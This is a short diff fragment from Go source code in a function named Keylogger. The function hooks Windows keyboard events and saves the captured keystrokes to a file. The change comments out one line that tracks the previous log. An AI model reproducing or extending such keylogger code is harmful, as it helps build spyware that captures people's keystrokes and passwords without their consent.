@@ -576,7 +576,7 @@ func Keylogger() {
        }
        if tmpKeylog != "" {
          savefile(tmpKeylog)
-         precLog = tmpKeylog
+         // precLog = tmpKeylog
          tmpKeylog = ""
        }
        return CallNextHookEx(keyboardHook, nCode, wparam, lparam)
